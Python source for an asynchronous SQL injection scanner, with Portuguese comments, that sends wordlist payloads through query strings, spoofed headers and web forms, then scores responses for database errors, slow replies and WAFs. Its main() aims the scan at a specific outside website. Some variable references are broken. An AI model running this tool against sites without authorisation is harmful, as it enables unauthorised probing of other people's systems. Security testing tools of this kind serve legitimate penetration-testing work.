import re
import random
import asyncio
from difflib import SequenceMatcher

import utils
import jsonlog
import HTMLAnalitcs
import supplementary
from Request import Request
from signatures import SQLI_ERRORS, DATABASE_HEADERS

class SQLI:
    def __init__(self, target, wordlist_file='wordlists/xss/default.txt', option='forms', save_file='output.json',
                 ua_status=False, headers=None, cookies=None, timeout=10, SSL=True, proxies=None,
                 interval=0, continue_=False, try_requests=1, verbose=True):

        self.target = utils.normalize_url(target, SSL)
        self.wordlist_file = wordlist_file
        self.option = option
        self.save_file = save_file if save_file.endswith('.json') else f'{save_file.rsplit(".", 1)[0]}.json'
        self.ua_status = ua_status
        self.headers = headers
        self.cookies = cookies
        self.timeout = timeout
        self.SSL = SSL
        self.proxies = proxies
        self.interval = interval
        self.continue_ = continue_
        self.try_requests = try_requests
        self.verbose = verbose
    
    # response  -> reecebe resposta bruta
    async def clean_html(self, response):
        return re.sub(r'\s+|<[^>]+>', '', response.lower())

    # payload   -> carga enviada
    # response  -> resposta bruta da requisicao 
    async def sqli_score_system(self, payload, response):
        score = 5  # Pontuação inicial, pre-validado (max: 20pts)
        suspicious = {
            'response_length': 3 if len(response.text) > 1500 else 2 if len(response.text) < 200 else 0,
            'response_time': 6 if response.elapsed.total_seconds() > 10 else 4 if response.elapsed.total_seconds() > 5 else 0,
            'response_code': 3 if response.status_code == 500 else 2 if response.status_code == 403 else 0,
            'response_header': 3 if "X-Powered-By" in response.headers and any(b in response.headers.get('X-Powered-By', '').lower() for b in DATABASE_HEADERS) else 0,
        }
        score += sum(v for v in suspicious.values())
        return score
    
    # payload   -> carga enviada
    # response  -> resposta bruta da request
    async def detect_reflected_sqli(self, payload, response):
        score = 0
        details = {
            'database_type': None,
            'message_error': None,
            'similarity': 0,
            'potential_sqli': False,
            'sqli_score': 0,
            'waf': None,
        }
        
        # SCORE SQLI POSSIBILITIES
        score = await self.sqli_score_system(payload, response)
        details['sqli_score'] = score

        # REMOVE DIRT ELEMENTS
        response_clear = await self.clean_html(response.text)

        for k, v in SQLI_ERRORS.items(): # itera sobre o dicionario
            # if any(re.search(error_msg.lower(), response.text.lower()) for error_msg in v): # verifica o tipo de erro no retorno
            for error_msg in v:
                similarity = SequenceMatcher(None, error_msg.lower(), response_clear).ratio()
                if re.search(error_msg.lower(), response.text.lower(), re.IGNORECASE | re.DOTALL) and similarity > 0.90:
                    details['database_type'] = k
                    details['message_error'] = error_msg.lower()
                    details['similarity'] = f'{similarity*100}%'
                    details['potential_sqli'] = True

        # WAF DETECTION
        details['waf'] = await supplementary.test_waf_detection(response) # verifica a chance de ter waf

        # BANNER CAPTURE
        banner = response.text if response.status_code in [301, 302, 307] else response.text[:500] # recolhe amostra do http

        return details, score, banner
        
    
    # ENGINE
    # 
    async def engine(self, payload, url, method='GET', params=None, headers=None):
        
        await asyncio.sleep(self.interval)
        
        if self.verbose:
            print(f'[+][{utils.time_now()}] Tentando: {url} \n{" "*3}[>]Payload: {payload}')
        
        # REQUISICAO
        status, r = Request(url, timeout=self.timeout, SSL=self.SSL, method=method, params=params,
                            proxies=self.proxies, headers=headers or self.headers,
                            cookies=self.cookies, ua_status=self.ua_status, redirect=False,
                            try_requests=self.try_requests).request()
        
        if status:
            # ANALYSIS RESPONSE
            details, score, banner = await self.detect_reflected_sqli(payload, r)
            if details['potential_sqli']:
                print(f'[!][{utils.time_now()}][{r.status_code}] Possivel vulnerabilidade: {self.target} -> {payload}')
                if self.verbose:
                    print(f'{" "*3}[>] BD Type: {details["database_type"]}')
                    print(f'{" "*3}[>] Msg: {details["message_error"]}')
                    print(f'{" "*3}[>] Similarity: {details["similarity"]}')
                    print(f'{" "*3}[>] Score: {score}')
                    #print(f'{" "*3}[>] WAF: {details["waf"]}\n')
            
        else:
            print(f'{" "*3}[>][{utils.time_now()}] Falha ao requisitar: {r}')
            details, score, banner = {}, 0, ''

        # LOG
        json_obj = jsonlog.ObjectJsonCommon.from_data(
            domain=self.target, payload=payload, url=url,
            ip='', r=r, banner=banner, details=details
        )
        await jsonlog.AsyncLogger(self.save_file).json_write(json_obj)
        return details, score, banner
    
    # RUN
    # RUN | CARCASE | SCRAG | ANATOMY
    async def run(self):
        
        # CARGA PESADA
        wordlist_file = self.wordlist_file
        if wordlist_file is None:
            print(f'[#][{utils.time_now()}] Usando payloads padrao')
            wordlist_file = 'wordlists/sqli/default_payload.txt'

        status_payload, payloads = await utils.fileReader(wordlist_file)
        if not status_payload:
            print(f'[-][{utils.time_now()}] {payloads}')
            return False, payloads
        
        payloads = [p.strip() for p in payloads if p.strip()]
        
        # QUERY STRING
        if self.option == 'query-string':
            if '*' not in self.target:
                print(f'[#][{utils.time_now()}] Nenhum parametro para substituicao encontrado (*)')
                return False, f'[#][{utils.time_now()}] Nao encontrado parametro para substituicao (*)'
            
            for payload in payloads:
                start_engine = await self.engine(payload, self.target.replace('*', payload))
                if start_engine[0].get('potential_sqli') == True and not continue_:
                    print(f'[#][{utils.time_now()}][{response.status_code}] Possivel vulnerabilidade: {self.target} -> {payload}')
            
            return True, f'[#][{utils.time_now()}] Finalizado com {self.wordlist_file} → {self.save_file}'
        
        # HEADERS
        if self.option == 'headers':
            total_combinations = len(payloads) ** 3
            used_combinations = set()

            while len(used_combinations) < total_combinations:
                current_headers = {
                    'User-Agent': random.choice(payloads).strip(),
                    'Referer': random.choice(payloads).strip(),
                    'X-Forwarded-For': random.choice(payloads).strip(),
                }
                combo_key = frozenset(current_headers.items())
                if combo_key in used_combinations:
                    continue

                used_combinations.add(combo_key)
                url = f"{self.target.split('://')[0]}://{self.target.split('://')[1]}" if self.target.startswith('http://') or self.target.startswith('https://') else f'https://{self.target}' if SSL else f'http://{self.target}'  # aqui o payload está no header, não na URL
                await self.engine(f'UA:{current_headers["User-Agent"]}|Ref:{current_headers["Referer"]}|IP:{current_headers["X-Forwarded-For"]}', url, headers=current_headers)
            
            return True, f'[#][{utils.time_now()}] Finalizado com {self.wordlist_file} → {self.save_file}'
        
        # FORMS
        if self.option == 'forms':
            method = 'GET'
            status_forms, forms = await HTMLAnalitcs.get_all_forms(self.target)
            if not status_forms or not forms:
                return False, f'[#][{utils.time_now()}] Nenhum formulário encontrado.'
            for payload in payloads:
                for form in forms:
                    form_details = await HTMLAnalitcs.get_form_details(form, payload)
                    action = form_details['action']
                    url = utils.merge_url(self.target, action) if action else self.target
                    method = form_details['method'].upper()
                    params = {inp['name']: inp['value'] for inp in form_details['inputs']}
                    await self.engine(payload, url, method=method, params=params)
            return True, f'[#][{utils.time_now()}] Finalizado com {self.wordlist_file} → {self.save_file}'    

        
        else:
            print(f'[#][{utils.time_now()}] Opcao informada inexistente')
            return False, f'[#][{utils.time_now()}] Opcao informada inexistente'



# MAIN
async def main():
    scanner = SQLI(
        target='https://www.socasadas.com',
        wordlist_file='wordlists/sqli/default.txt',
        option='forms',
        save_file='xsss_objetct.json',
        verbose=True
    )
    status, result = await scanner.run()
    print(result)


if __name__ == '__main__':
    asyncio.run(main())
